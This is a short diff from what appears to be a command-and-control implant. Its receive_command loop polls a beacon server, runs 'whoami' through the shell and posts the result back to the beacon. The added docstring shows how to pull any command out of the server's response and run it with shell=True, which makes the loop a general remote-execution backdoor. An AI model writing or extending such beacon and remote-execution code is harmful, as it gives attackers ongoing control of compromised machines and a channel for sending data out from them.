@@ -18,6 +18,12 @@ def receive_command(stop_event):
             if "whoami" in response.text:
                 result = subprocess.check_output("whoami", shell=True).decode()
                 requests.post(f"{beacon}/post_result", data=result)
+            """
+                or you can parse the command like this for a more dynamic approach:
+                    command = response.text.split(" | ")
+                    command = command[1]
+                    result = subprocess.check_output(command, shell=True).decode()...
+            """
         except requests.exceptions.ConnectionError:
             pass
         time.sleep(1)
